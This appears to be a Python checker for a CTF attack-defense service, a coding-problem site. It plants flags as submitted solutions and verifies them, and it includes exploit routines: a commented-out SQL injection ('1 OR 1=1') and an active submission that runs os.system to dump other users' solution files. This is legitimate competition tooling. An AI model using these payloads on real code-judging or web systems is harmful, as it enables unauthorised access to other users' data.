from asyncio import StreamReader, StreamWriter
import asyncio
import random
import string
import faker
import json
import re
from httpx import AsyncClient
from title_generator import generate_title
from typing import Optional
from logging import LoggerAdapter

from enochecker3 import (
    ChainDB,
    Enochecker,
    ExploitCheckerTaskMessage,
    FlagSearcher,
    BaseCheckerTaskMessage,
    PutflagCheckerTaskMessage,
    GetflagCheckerTaskMessage,
    PutnoiseCheckerTaskMessage,
    GetnoiseCheckerTaskMessage,
    HavocCheckerTaskMessage,
    MumbleException,
    OfflineException,
    InternalErrorException,
    PutflagCheckerTaskMessage,
    AsyncSocket,
)
from enochecker3.utils import assert_equals, assert_in

"""
Checker config
"""

SERVICE_PORT = 8055
checker = Enochecker("shetcode", SERVICE_PORT)
app = lambda: checker.app


"""
Utility functions
"""

class Connection:
    def __init__(self, logger: LoggerAdapter, client: AsyncClient):
        self.client = client
        self.logger = logger

    async def register_user(self, username: str, password: str):
        response = await self.client.post(
            "/register",
            data={"username": username, "password": password}
        )
        data = response.json()
        
        if data.get("success") == False or response.status_code not in [200, 201, 302]:
            raise MumbleException("Failed to register user")

    async def login_user(self, username: str, password: str):
        response = await self.client.post(
            "/login",
            data={"username": username, "password": password}
        )
        data = response.json()
        
        if data.get("success") == False or response.status_code not in [200, 201, 302]:
            raise MumbleException("Failed to log in!")


@checker.register_dependency
def _get_connection(client: AsyncClient, logger: LoggerAdapter) -> Connection:
    return Connection(logger, client)


"""
CHECKER FUNCTIONS
"""

# @checker.putflag(0)
# async def putflag_drafts(
#     task: PutflagCheckerTaskMessage,
#     db: ChainDB,
#     client: AsyncClient,
#     logger: LoggerAdapter,    
# ) -> None:
#     conn = Connection(logger, client)
#     username: str = "checker_" + "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password: str = "checker_" + "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )

#     await conn.register_user(username, password)

#     await conn.login_user(username, password)

#     problem_title = "problem_" + "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
    
#     try: 
#         headers = {"Accept": "application/json"}
#         response = await conn.client.post(
#             "/problems/create",
#             headers=headers,
#             data={
#                 "title": problem_title,
#                 "description": task.flag,
#                 "difficulty": random.choice(["easy", "medium", "hard"]),
#                 "testCases": json.dumps(["sample input"]),
#                 "expectedOutputs": json.dumps(["sample output"]),
#                 "isPublished": "false",
#                 "isPrivate": "false",
#                 "maxRuntime": "1.0"
#             }
#         )
        
#         data = response.json()
        
#         if response.status_code != 200 or not data.get("success"):
#             error_msg = data.get("message", "Unknown error")
#             raise MumbleException(f"Failed to post flag: {error_msg}")
        
#         problem_id = data.get("problem_id")
#         if not problem_id:
#             raise MumbleException("No problem ID in response")
        
#         # Store the username, password, and problem ID
#         await db.set("userdata", (username, password, problem_id))
        
#     except Exception as ex:
#         raise MumbleException(f"Error posting flag: {ex}")
        
#     return username

@checker.putflag(0)
async def putflag_solutions(
    task: PutflagCheckerTaskMessage,
    db: ChainDB,
    client: AsyncClient,
    logger: LoggerAdapter,    
) -> None:
    conn = Connection(logger, client)
    username: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    await conn.register_user(username, password)

    await conn.login_user(username, password)

    problem_title = generate_title()
    problem_description = generate_title()

    headers = {"Accept": "application/json"}
    response = await conn.client.post(
            "/problems/create",
            headers=headers,
            data={
                "title": problem_title,
                "description": problem_description,
                "difficulty": random.choice(["easy", "medium", "hard"]),
                "testCases": json.dumps(["sample input"]),
                "expectedOutputs": json.dumps(["sample output"]),
                "isPublished": "true",
                "isPrivate": "false",
                "maxRuntime": "1.0"
            }
        )

    data = response.json()
    problem_id = data.get("problem_id")
    if not problem_id:
        raise MumbleException("No problem ID in response")
    
    response = await conn.client.post(
        f"/problems/details/{problem_id}/submit",
        data={"code": f"""print("{task.flag}")"""}
    )
    
    if response.status_code != 200:
        raise MumbleException(f"Failed to submit solution: {response.status_code}")
    
    await db.set("userdata", (username, password, problem_id))
    
    


# @checker.getflag(0)
# async def getflag_drafts(
#     task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
# ) -> None:
#     try:
#         username, password, problem_id = await db.get("userdata")
#     except KeyError:
#         raise MumbleException("Missing database entry from putflag")
    
#     conn = Connection(logger, client)

#     await conn.login_user(username, password)

#     response = await conn.client.get(f"/problems/details/{problem_id}")
    
#     if response.status_code != 200:
#         raise MumbleException(f"Failed to retrieve problem. Status code: {response.status_code}")
    
#     content = response.text
    
#     # Check if flag is in the response
#     if task.flag not in content:
#         raise MumbleException("Flag was not found in the problem content")
    
@checker.getflag(0)
async def getflag_solutions(
    task: GetflagCheckerTaskMessage, db: ChainDB, client: AsyncClient, logger: LoggerAdapter
) -> None:
    try:
        username, password, problem_id = await db.get("userdata")
    except KeyError:
        raise MumbleException("Missing database entry from putflag")
    
    conn = Connection(logger, client)

    await conn.login_user(username, password)

    response = await conn.client.get(f"/problems/details/{problem_id}")

    if response.status_code != 200:
        raise MumbleException(f"Failed to retrieve problem. Status code: {response.status_code}")
    
    content = response.text

    if task.flag not in content:
        raise MumbleException("Flag was not found in the problem content")
    
    

# @checker.exploit(0)
# async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, client: AsyncClient, logger: LoggerAdapter) -> Optional[str]:
#     username: str = "checker_" + "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )
#     password: str = "checker_" + "".join(
#         random.choices(string.ascii_uppercase + string.digits, k=12)
#     )

#     conn = Connection(logger, client)
#     await conn.register_user(username, password)
#     await conn.login_user(username, password)

#     response = await conn.client.post(
#         "/api/problems",
#         data={"author_id": "1 OR 1=1"} # SQL injection to get all problems
#     )
    
#     if response.status_code not in [200, 201, 302]:
#         logger.debug(f"Failed to exploit service: HTTP {response.status_code, response.text}")
#         raise MumbleException(f"Failed to exploit service: HTTP {response.status_code}")
    
#     logger.debug(f"Exploit response: {response.text}")
#     data = response.json()
#     logger.debug(f"Exploit response: {data}")
    
#     for problem in data:
#         if not problem.get("is_published", False):
#             description = problem.get("description", "")
#             if flag := searcher.search_flag(description):
#                 return flag
    
#     raise MumbleException("No flag found in any problem description")

@checker.exploit(0)
async def exploit1(task: ExploitCheckerTaskMessage, 
                   searcher: FlagSearcher, 
                   client: AsyncClient, 
                   logger: LoggerAdapter
) -> Optional[str]:
    username: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )
    password: str = "checker_" + "".join(
        random.choices(string.ascii_uppercase + string.digits, k=12)
    )

    conn = Connection(logger, client)
    await conn.register_user(username, password)
    await conn.login_user(username, password)
    
    exploit_script = """import os
os.system('find submissions -type f -name "solution.py" | while read -r file; do echo "===== $file ====="; cat "$file"; echo; done')
"""

    response = await conn.client.post(
        "/problems/details/1/submit",
        data={"code": exploit_script}
    )

    if response.status_code != 200:
        raise MumbleException(f"Failed to submit exploit: {response.status_code}")
    
    data = response.text

    if task.flag not in data:
        raise MumbleException("Flag was not found in the exploit output")
    
    return task.flag

if __name__ == "__main__":
    checker.run()